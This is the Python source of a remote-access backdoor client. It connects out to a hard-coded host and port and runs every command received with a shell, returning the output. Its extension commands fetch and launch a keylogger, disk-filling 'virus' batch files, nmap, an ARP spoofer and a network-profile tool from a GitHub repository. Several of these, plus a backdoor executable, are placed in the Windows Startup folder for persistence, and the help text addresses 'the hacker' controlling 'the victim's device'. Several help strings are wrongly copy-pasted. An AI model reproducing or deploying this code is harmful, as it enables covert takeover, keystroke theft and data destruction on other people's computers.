import os
import socket
import subprocess
import sys
from time import sleep
import threading

target_host = "192.168.1.36"
target_port = 3080


def main():
    global client

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            print("[-] - Try to connect " + target_host + " : " + str(target_port))
            sleep(2)
            client.connect((target_host, target_port))
            print(f"[+] - connected with [ {target_host}:{target_port} ] ")
        except:
            continue
        else:
            while True:
                try:
                    buffer = client.recv(4096).decode().strip()
                    if (buffer.strip().startswith("cd")):
                        path = buffer.split()
                        if len(path) == 2:
                            os.chdir(path[1])
                        client.send(os.getcwd().encode())
                    else:
                        buffer = Additions(buffer)
                        cmd = subprocess.Popen(buffer, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        result = cmd.stdout.read() + cmd.stderr.read() + f"\n".encode()
                        try:
                            client.send(result)
                        except:
                            break
                except Exception as e:
                    break


def Additions(buffer):
    obuf = buffer 
    if obuf.find("apps_list ") >= 0:
        if obuf.find("info") >= 0:
            obuf = "echo [APPLIST] [INFO] - This command allows you to view all the applications installed on the victim's device as well as those that are currently running"
        elif  obuf.find("run") >= 0:
            if obuf.find("all") >= 0:
                obuf = "powershell -Command \"Get-Process | Format-Table Handles,NPM,PM,WS,CPU,Id,SI,ProcessName,Name,Mainwindowtitle -AutoSize\""
            else:
                obuf = "powershell -Command \"Get-Process | Where-Object { $_.MainWindowTitle } | Format-Table Handles,NPM,PM,WS,CPU,Id,SI,ProcessName,Name,Mainwindowtitle -AutoSize\""
            
        elif obuf.find("all") >= 0:
            obuf = "powershell -Command \"Get-AppxPackage\""
    elif obuf.find("ext ") >= 0:
        if obuf.find("info") >= 0:
            obuf = CE_InfoExt(obuf)
        elif obuf.find("run") >= 0:
            obuf = CE_RunExt(obuf)
        elif obuf.find("startup") >= 0:
            obuf = CE_StartupExt(obuf)
        elif obuf.find("stop") >= 0:
            obuf = CE_StopExt(obuf)
    
    return obuf



######################################
# Extensions
######################################

def CE_InfoExt(buffer):
    ebuf = buffer 

    if ebuf.find("keylog") >= 0:

        ebuf = "echo [EXT] [INFO] - This extension is built in C++ language and it logs all mouse and keyboard events and makes them available in C:\\ProgramData\\Ms\\log.txt file. And the keylogger.exe file is in C:\\ProgramData\\Ms All events will be added to the file cumulatively, you can delete it if you want to re-registration, or you can use the following command: $ ext reset keylog "
        ebuf += " && echo. && echo [ $ ] - Available Commands : "
        ebuf += " && echo [ $ ext run keylog ] -  for start recording "
        ebuf += " && echo [ $ ext info keylog ] - show some info for keylog extension "
        ebuf += " && echo [ $ ext reset keylog ] - delete keylog file :  C:\\ProgramData\\Ms\\log.txt "

    elif ebuf.find("fill_storage") >= 0:
        ebuf = "echo [EXT] [INFO] - This extension is built in betch, This add-on fills the device with large files and is created very quickly so that the storage capacity of the device can be filled in three seconds, and you can also make it more dangerous by copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup . So that it works automatically when you startup the device "
        ebuf += " && echo. && echo [ $ ] - Available Commands : "
        ebuf += " && echo [ $ ext run fill_storage ] -  for start fill storage "
        ebuf += " && echo [ $ ext startup fill_storage ] - copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup "
        ebuf += " && echo [ $ ext info fill_storage ] - show some info for fill_storage extension "

    elif ebuf.find("nmap") >= 0:
        ebuf = "echo [EXT] [INFO] - This extension is built in betch, This add-on fills the device with large files and is created very quickly so that the storage capacity of the device can be filled in three seconds, and you can also make it more dangerous by copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup . So that it works automatically when you startup the device "
        ebuf += " && echo. && echo [ $ ] - Available Commands : "
        ebuf += " && echo [ $ ext run nmap ] -  for download and make it ready for run "
        ebuf += " && echo [ $ C:\\ProgramData\\Ms\\Nmap\\nmap ] -  for start nmap "
        ebuf += " && echo [ $ ext info nmap ] - show some info for nmap extension "
  
    elif ebuf.find("arp_spoof") >= 0:
        ebuf = "echo [EXT] [INFO] - This extension is built in betch, This add-on fills the device with large files and is created very quickly so that the storage capacity of the device can be filled in three seconds, and you can also make it more dangerous by copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup . So that it works automatically when you startup the device "
        ebuf += " && echo. && echo [ $ ] - Available Commands : "
        ebuf += " && echo [ $ ext run arp_spoof ] -  for download and make it ready for run "
        ebuf += " && echo [ $ C:\\ProgramData\\Ms\\arp_spoof\\arp_spoof.py ] -  for start arp_spoof "
        ebuf += " && echo [ $ ext info arp_spoof ] - show some info for arp_spoof extension "
    else:
        ebuf = "echo [EXT] [INFO] - The extensions are based on multiple languages and different functions that achieve what the hacker wants to control the victim's device in a simple and fast way && echo Available extensions : && echo -- keylog && echo -- fill_storage && echo -- networks_profile && echo -- nmap && echo -- arp_spoof"

    return ebuf


def CE_RunExt(buffer):
    ebuf = buffer 


    command = "IF NOT EXIST C:\\ProgramData ( mkdir C:\\ProgramData ) ELSE ( echo ) && IF NOT EXIST C:\\ProgramData\\Ms ( mkdir C:\\ProgramData\\Ms ) ELSE ( echo ) "
    default_commad = command

    if ebuf.find("keylog") >= 0:
        command += " && echo. && echo [EXT] [DOWNLOAD] - keylogextension in C:\\ProgramData\\Ms\\keylogger.exe && echo [EXT] [RUN] - keylog extension .. && echo. "
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o C:\\ProgramData\\Ms\\keylogger.exe && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( start C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo ) "
    if ebuf.find("nmap") >= 0:
        command += " && echo. && echo [EXT] [DOWNLOAD] - Nmap extension in C:\\ProgramData\\Ms\\Nmap && echo [EXT] [RUN] - C:\\ProgramData\\Ms\\Nmap\\nmap && echo. "
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/Nmap.zip -o C:\\ProgramData\\Ms\\Nmap.zip && IF EXIST C:\\ProgramData\\Ms\\Nmap.zip ( powershell -Command \"Expand-Archive -Path \"C:\\ProgramData\\Ms\\Nmap.zip\" -DestinationPath \"C:\\ProgramData\\Ms\"\" ) ELSE ( echo ) "
    if ebuf.find("arp_spoof") >= 0:
        command += " && echo. && echo [EXT] [DOWNLOAD] - arp_spoof extension in C:\\ProgramData\\Ms\\arp_spoof && echo [EXT] [RUN] - C:\\ProgramData\\Ms\\arp_spoof\\arp_spoof.py && echo."
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/arp_spoof.zip -o C:\\ProgramData\\Ms\\arp_spoof.zip && IF EXIST C:\\ProgramData\\Ms\\arp_spoof.zip ( powershell -Command \"Expand-Archive -Path \"C:\\ProgramData\\Ms\\arp_spoof.zip\" -DestinationPath \"C:\\ProgramData\\Ms\"\" ) ELSE ( echo ) "
    if ebuf.find("networks_profile") >= 0:
        command += " && echo. && echo [EXT] [DOWNLOAD] - networks_profile extension in C:\\ProgramData\\Ms\\networks_profile.exe && echo [EXT] [RUN] - networks_profile extension .. && echo."
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/networks_profile.exe -o C:\\ProgramData\\Ms\\networks_profile.exe && IF EXIST C:\\ProgramData\\Ms\\networks_profile.exe ( start C:\\ProgramData\\Ms\\networks_profile.exe ) ELSE ( echo ) "

    if ebuf.find("fill_storage") >= 0:
    
        command += " && echo [EXT] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms && echo [EXT] [RUN] - fill_storage extension .. && echo."
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo ) "
    if ebuf.find("test_virus") >= 0:
        command += " && echo [EXT] [DOWNLOAD] - test [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms && echo [EXT] [RUN] - test_virus extension .. && echo."
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/test_move.bat -o C:\\ProgramData\\Ms\\test_move.bat && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/test_virus.bat -o C:\\ProgramData\\Ms\\test_virus.bat "
        if ebuf.find("run") >= 0 :
            command += " && IF EXIST C:\\ProgramData\\Ms\\test_move.bat ( start C:\\ProgramData\\Ms\\test_move.bat ) ELSE ( echo ) "
        

    if default_commad == command:
        ebuf = "echo [EXT] [ERR] - You must use a valid extension name !"
    else:
        ebuf = command

    return ebuf

# powershell -Command Expand-Archive -Path 'Nmap.zip' -DestinationPath '.'

def CE_StartupExt(buffer):
    ebuf = buffer 

    command = "IF NOT EXIST C:\\ProgramData ( mkdir C:\\ProgramData ) ELSE ( echo ) && IF NOT EXIST C:\\ProgramData\\Ms ( mkdir C:\\ProgramData\\Ms ) ELSE ( echo ) "
    default_commad = command

    if ebuf.find("keylog") >= 0:
        command += " && echo. && echo [EXT] [DOWNLOAD] - keylogextension in C:\\ProgramData\\Ms\\keylogger.exe && echo [EXT] [RUN] - keylog extension .. && echo. "

        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe\""
        if ebuf.find("run") >= 0:
            command += " && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe\" ) ELSE ( echo ) "
    elif ebuf.find("fill_storage") >= 0:
        command += " && echo [EXT] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms && echo [EXT] [RUN] - fill_storage extension .. && echo."
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_virus.bat\" "
        if ebuf.find("run") >= 0:
            command += " && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ) ELSE ( echo ) "
    elif ebuf.find("test_virus") >= 0:
        command += " && echo [EXT] [DOWNLOAD] - test [ move.bat, virus.bat ] extension in C:\\ProgramData\\Ms && echo [EXT] [RUN] - test_virus extension .. && echo."

        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/test_move.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test_move.bat\" && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/test_virus.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test_virus.bat\" "
        if ebuf.find("run") >= 0:
        
            command += " && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.bat\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test_move.bat\" ) ELSE ( echo ) "
    

    if default_commad == command:
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/backdoor.exe -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.exe\""

    ebuf = command

    return ebuf


def CE_StopExt(buffer):
    ebuf = buffer 

    if ebuf.find("keylog") >= 0:
        ebuf = "powershell -Command \"Stop-Process -Name \"keylogger\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\keylogger.exe\"} | Stop-Process -WhatIf\""
    elif ebuf.find("fill_storage") >= 0:
        ebuf = "powershell -Command \"Stop-Process -Name \"fill_storage_virus\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\fill_storage_virus.bat\"} | Stop-Process -WhatIf\""
    # else if (ebuf.find("networks_profile") >= 0:
    # {
    #     ebuf = "powershell -Command \"Stop-Process -Name \"networks_profile\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\networks_profile.exe\"} | Stop-Process -WhatIf\""
    # }

    elif ebuf.find("arp_spoof") >= 0:
        ebuf = "powershell -Command \"Stop-Process -Name \"arp_spoof\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\arp_spoof.exe\"} | Stop-Process -WhatIf\""

    return ebuf


try:
    main()
except KeyboardInterrupt:
    client.close()
    sys.exit()

